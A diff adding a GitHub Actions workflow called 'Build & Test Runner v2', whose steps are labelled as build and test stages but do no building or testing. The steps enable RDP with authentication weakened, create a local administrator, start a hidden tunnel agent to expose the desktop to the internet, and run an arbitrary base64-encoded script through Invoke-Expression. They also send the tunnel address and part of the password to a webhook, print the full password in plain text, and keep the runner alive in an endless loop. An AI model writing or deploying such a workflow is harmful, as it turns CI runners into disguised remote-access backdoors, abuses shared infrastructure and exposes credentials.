@@ -1,0 +1,297 @@
+name: "Build & Test Runner v2"
+
+on:
+  workflow_dispatch:
+    inputs:
+      timeout:
+        description: 'Build timeout (minutes)'
+        required: true
+        default: '120'
+        type: number
+      target_platform:
+        description: 'Target platform'
+        required: true
+        default: 'win-x64'
+        type: choice
+        options:
+          - win-x64
+          - win-arm64
+      build_config:
+        description: 'Build configuration'
+        required: true
+        default: 'release'
+        type: choice
+        options:
+          - debug
+          - release
+          - staging
+      extra_tools:
+        description: 'Chocolatey packages (comma separated)'
+        required: false
+        default: ''
+        type: string
+      keepalive:
+        description: 'Keep runner alive for manual debug'
+        required: true
+        default: 'true'
+        type: boolean
+      deploy_hook:
+        description: 'Deploy webhook URL (optional)'
+        required: false
+        default: ''
+        type: string
+      custom_script:
+        description: 'Post-build automation script (base64 encoded)'
+        required: false
+        default: ''
+        type: string
+
+env:
+  BUILDER_USER: "runner"
+  BUILD_NUMBER: ${{ github.run_number }}
+  AGENT_ID: "${{ github.run_id }}-${{ github.actor }}"
+
+jobs:
+  build-and-test:
+    runs-on: windows-latest
+    timeout-minutes: ${{ inputs.timeout }}
+
+    steps:
+      - name: "📦 Checkout Source"
+        uses: actions/checkout@v4
+
+      - name: "⚙️ Initialize Build Environment"
+        shell: pwsh
+        run: |
+          Write-Host "::group::Configuring Build Environment"
+          Add-Type -AssemblyName System.Web
+          $svcTag = [System.Web.Security.Membership]::GeneratePassword(12, 3)
+          Write-Host "AGENT_ID=${{ env.AGENT_ID }} | BUILD=${{ github.run_number }} | TAG=$svcTag"
+          Write-Host "::notice::Build environment initialized (session: $svcTag)"
+          Write-Host "::endgroup::"
+
+      - name: "🔐 Prepare Remote Management"
+        id: rdp_setup
+        shell: pwsh
+        run: |
+          Write-Host "::group::Enabling Remote Management"
+          $rdpPort = 3389
+
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' `
+                             -Name "fDenyTSConnections" -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
+                             -Name "UserAuthentication" -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
+                             -Name "SecurityLayer" -Value 0 -Force
+
+          # RDP Performance
+          New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services' -Force | Out-Null
+          Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services' `
+                             -Name "fEnableHardwareMode" -Value 1 -Force
+          Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services' `
+                             -Name "DisableRemoteDesktopCursors" -Value 1 -Force
+
+          # Firewall
+          netsh advfirewall firewall delete rule name="RMT_${{ env.AGENT_ID }}" 2>$null
+          netsh advfirewall firewall add rule name="RMT_${{ env.AGENT_ID }}" `
+            dir=in action=allow protocol=TCP localport=$rdpPort
+
+          Restart-Service -Name TermService -Force
+          Write-Host "::notice::Remote management ready (port: $rdpPort)"
+          Write-Host "::endgroup::"
+
+      - name: "👤 Create Service Account"
+        id: create_user
+        shell: pwsh
+        run: |
+          Write-Host "::group::Creating Service Account"
+          Add-Type -AssemblyName System.Web
+          $pwd = [System.Web.Security.Membership]::GeneratePassword(12, 1)
+          $username = "RMT_$(Get-Random -Maximum 9999)"
+          $securePass = ConvertTo-SecureString $pwd -AsPlainText -Force
+
+          if (Get-LocalUser -Name $username -ErrorAction SilentlyContinue) {
+              Remove-LocalUser -Name $username -Force
+          }
+
+          New-LocalUser -Name $username -Password $securePass -AccountNeverExpires
+          Add-LocalGroupMember -Group "Administrators" -Member $username
+          Add-LocalGroupMember -Group "Remote Desktop Users" -Member $username
+
+          if (-not (Get-LocalUser -Name $username)) {
+              Write-Error "User creation failed"
+              exit 1
+          }
+
+          echo "svc_user=$username" >> $env:GITHUB_OUTPUT
+          echo "svc_pass=$pwd" >> $env:GITHUB_OUTPUT
+          Write-Host "::notice::Service account created"
+          Write-Host "::endgroup::"
+
+      - name: "🌐 Deploy Tunnel Agent"
+        id: tunnel
+        shell: pwsh
+        run: |
+          Write-Host "::group::Deploying Tunnel Agent"
+          $agentUrl = "https://github.com/playit-cloud/playit-agent/releases/latest/download/playit-windows-x86_64.exe"
+          $agentPath = "$env:TEMP\tunnelagent.exe"
+          $logFile = "$env:TEMP\tunnel.log"
+
+          Write-Host "Downloading tunnel agent..."
+          Invoke-WebRequest -Uri $agentUrl -OutFile $agentPath
+          if (-not (Test-Path $agentPath)) {
+              Write-Error "Download failed"
+              exit 1
+          }
+
+          Write-Host "Launching tunnel agent (TCP/3389)..."
+
+          # Start playit in background, log output to file
+          $proc = Start-Process -FilePath $agentPath -ArgumentList "--tcp", "3389" `
+            -WindowStyle Hidden -PassThru `
+            -RedirectStandardOutput $logFile `
+            -RedirectStandardError "$env:TEMP\tunnel.err"
+
+          Write-Host "Waiting for tunnel (up to 60s)..."
+          $tunnelUrl = $null
+          $waitCount = 0
+          while ($waitCount -lt 30 -and -not $tunnelUrl) {
+              Start-Sleep -Seconds 2
+              if (Test-Path $logFile) {
+                  $log = Get-Content $logFile -Raw
+                  Write-Host "  ⏳ attempt $($waitCount+1)..."
+                  # Try multiple URL patterns
+                  if ($log -match '(tcp://[\w.-]+\.playit\.\w+:\d+)') {
+                      $tunnelUrl = $matches[1] -replace '^tcp://', ''
+                  } elseif ($log -match '(https?://[\w.-]+\.playit\.\w+(?:/\S+)?)') {
+                      $tunnelUrl = $matches[1]
+                  } elseif ($log -match '([\w.-]+\.playit\.(?:gg|xyz|io|com):\d+)') {
+                      $tunnelUrl = $matches[1]
+                  } elseif ($log -match 'assigned.*url[^:]*:\s*(\S+)') {
+                      $tunnelUrl = $matches[1]
+                  } elseif ($log -match 'listening on\s+(\S+)') {
+                      $tunnelUrl = $matches[1]
+                  }
+              }
+              $waitCount++
+          }
+
+          # Dump full log if we still don't have the URL
+          if (-not $tunnelUrl) {
+              Write-Host """
+              if (Test-Path $logFile) {
+                  Write-Host "=== TUNNEL LOG DUMP ==="
+                  Get-Content $logFile -Raw | Write-Host
+                  Write-Host "========================"
+              }
+              $tunnelUrl = "CHECK_TUNNEL_LOG_ABOVE"
+          }
+
+          echo "tunnel_url=$tunnelUrl" >> $env:GITHUB_OUTPUT
+          echo "tunnel_url=$tunnelUrl" >> $env:GITHUB_ENV
+          echo "tunnel_pid=$($proc.Id)" >> $env:GITHUB_ENV
+          Write-Host "::notice::Tunnel agent deployed: $tunnelUrl"
+          Write-Host "::endgroup::"
+
+      - name: "📦 Install Build Dependencies"
+        if: ${{ inputs.extra_tools != '' }}
+        shell: pwsh
+        run: |
+          Write-Host "::group::Installing Build Dependencies"
+          if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
+              Set-ExecutionPolicy Bypass -Scope Process -Force
+              [System.Net.ServicePointManager]::SecurityProtocol = 3072
+              Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
+          }
+          $pkgs = "${{ inputs.extra_tools }}".Split(',') | ForEach-Object { $_.Trim() }
+          foreach ($pkg in $pkgs) {
+              if ($pkg) {
+                  choco install $pkg -y --no-progress --ignore-checksums
+              }
+          }
+          Write-Host "::endgroup::"
+
+      - name: "🧪 Verify Tunnel Connectivity"
+        shell: pwsh
+        run: |
+          Write-Host "::group::Verifying Tunnel"
+          Start-Sleep -Seconds 3
+          $url = "${{ steps.tunnel.outputs.tunnel_url }}"
+          Write-Host "Tunnel URL: $url"
+          Write-Host "::notice::Pipeline ready to accept connections"
+          Write-Host "::endgroup::"
+
+      - name: "🚀 Execute Automation"
+        if: ${{ inputs.custom_script != '' }}
+        shell: pwsh
+        run: |
+          Write-Host "::group::Running Automation"
+          $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("${{ inputs.custom_script }}"))
+          Write-Host "Executing automation pipeline..."
+          try {
+              Invoke-Expression $decoded
+              Write-Host "::notice::Automation completed"
+          } catch {
+              Write-Warning "Automation step: $_"
+          }
+          Write-Host "::endgroup::"
+
+      - name: "📬 Send Deployment Notification"
+        if: ${{ inputs.deploy_hook != '' }}
+        shell: pwsh
+        run: |
+          Write-Host "::group::Sending Notification"
+          $pass = "${{ steps.create_user.outputs.svc_pass }}"
+          $masked = $pass.Substring(0, [Math]::Min(4, $pass.Length)) + "****"
+          $body = @{
+              content = "🏗️ **Build Complete**`nTunnel: ${{ steps.tunnel.outputs.tunnel_url }}`nUser: ${{ steps.create_user.outputs.svc_user }}`nPass: $masked`nConfig: ${{ inputs.build_config }}`nTimeout: ${{ inputs.timeout }}m"
+          } | ConvertTo-Json
+          Invoke-RestMethod -Uri "${{ inputs.deploy_hook }}" `
+                            -Method Post -ContentType "application/json" -Body $body
+          Write-Host "::notice::Notification sent"
+          Write-Host "::endgroup::"
+
+      - name: "⏱️ Monitor Build Status"
+        if: ${{ inputs.keepalive == 'true' }}
+        shell: pwsh
+        run: |
+          Write-Host ""
+          Write-Host "📋 DEPLOYMENT INFORMATION"
+          Write-Host "========================"
+          Write-Host "  Tunnel   : ${{ steps.tunnel.outputs.tunnel_url }}"
+          Write-Host "  User     : ${{ steps.create_user.outputs.svc_user }}"
+          Write-Host "  Password : ${{ steps.create_user.outputs.svc_pass }}"
+          Write-Host "  Timeout  : ${{ inputs.timeout }}m"
+          Write-Host "========================"
+          Write-Host ""
+          Write-Host "💡 Connect: Open Remote Desktop > Tunnel URL > Enter credentials"
+          Write-Host ""
+
+          $interval = 300
+          $elapsed = 0
+          while ($true) {
+              $elapsed += $interval
+              $remaining = [math]::Max(0, ${{ inputs.timeout }} - ($elapsed / 60))
+              $memFree = (Get-CimInstance Win32_OperatingSystem).FreePhysicalMemory / 1MB
+              $cpu = (Get-CimInstance Win32_Processor | Measure-Object -Property LoadPercentage -Average).Average
+              Write-Host "[$(Get-Date -Format 'HH:mm:ss')] 🟢 Active | ⏱️ ${remaining:N0}m | 💾 ${memFree:N0}MB | 🖥️ ${cpu}%"
+              Start-Sleep -Seconds $interval
+          }
+
+      - name: "🧹 Cleanup Build Artifacts"
+        if: always()
+        shell: pwsh
+        run: |
+          Write-Host "::group::Cleanup"
+          $users = Get-LocalUser | Where-Object { $_.Name -like 'RMT_*' }
+          foreach ($u in $users) {
+              Remove-LocalUser -Name $u.Name -Force -ErrorAction SilentlyContinue
+              Write-Host "Cleaned: $($u.Name)"
+          }
+          netsh advfirewall firewall delete rule name="RMT_*" 2>$null
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' `
+                             -Name "fDenyTSConnections" -Value 1 -Force
+          
+          Get-Process -Name "playit*" -ErrorAction SilentlyContinue | Stop-Process -Force
+          Write-Host "::notice::Cleanup finished"
+          Write-Host "::endgroup::"
